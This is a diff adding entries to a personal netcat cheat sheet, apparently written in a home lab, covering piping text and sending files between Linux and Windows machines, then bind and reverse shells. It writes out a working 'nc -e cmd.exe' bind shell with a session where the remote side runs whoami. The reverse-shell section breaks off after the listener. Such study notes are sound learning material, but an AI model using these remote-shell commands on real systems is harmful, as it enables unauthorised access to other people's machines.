@@ -16,6 +16,8 @@ $ nc 127.0.0.1 1234
 C:\> nc 127.0.0.1 123
 
 # 3 - Pipe data to a specific address on a specific port
+    - Note: Subtle difference of quotes; windows CLI will include them as part
+      of the text to be echoed
 $ echo "HELLO WORLD" | nc 127.0.0.1 1234
 C:\> echo HELLO WORLD | nc 127.0.0.1 1234
 
@@ -46,9 +48,13 @@ helloo              |
 can you hear me     |
 
 # 4 - Sending files over netcat.
-#   - Note these connections will hang open until sender/receiver termintes
+#   - Note these connections will hang open until sender/receiver terminates
 sender@computerA~$ nc 127.0.0.1 1234 < somefile.txt 
+-
 sender@compputuerA~$ cat someFile.txt | nc 127.0.0.1 1234
+-
+C:\>nc 10.0.34.229 1234 < test.txt
+-
 
 # 4a - Receiver output
 receiver@computerB:~$ nc -nlvp 1234
@@ -58,3 +64,46 @@ SomeFileContent
 
 # 4b - directing received data to file
 receiver@computerB:~$ nc -nlvp 1234 > someReceivedFile.txt
+---
+C:\> nc -lvp 1234 > fromlinux.txt
+listening on [any] 1234 ...
+192.168.56.1: inverse host lookup failed: h_errno 11004: NO_DATA
+connect to [192.168.56.101] from (UNKNOWN) [192.168.56.1] 54778: NO_DATA
+
+^C
+C:\>type fromlinux.txt
+hello from linux
+
+# 5 - BIND SHELLS
+    - Note: this is often confusing to people, but the key concept is the direction
+      of the connnection. I.e. where's the listener, and where's it tied to? 
+    - Below we bind a cmd.exe shell to port 1234 on our windows box, and then wait
+      for an external connection; this would be useful if say all OUTBOUND flows were
+      blocked from the windows box, but inbound flows were allowed.
+    - This couuld also work in the opposite direction, where an external user
+      binds a shell to a public IP address and port, and an internal user connects to
+      said port 
+C:\Users\IEUser\Desktop>nc -nlvp 1234 -e cmd.exe
+listening on [any] 1234 ...
+connect to [192.168.56.101] from (UNKNOWN) [192.168.56.1] 58632
+---
+    - on the external machine (arbitrary; here we used linux)
+user@computer:~$ nc 192.168.56.101 1234
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\IEUser\Desktop>whoami
+whoami
+ie8win7\ieuser
+
+# 6 - Reverse Shells 
+    - The key point here again is the placement of the listener; i.e if i'm the attacker
+      and I setup a listener on by box to wait for a shell from the target, i'm creating
+      a reverse shell.
+    - below we setup a listener on a windows box then send a reverse shell from linux
+
+C:\> nc -nlvp 1234
+Listening on [0.0.0.0] (family 0, port 1234)
+
+---
+
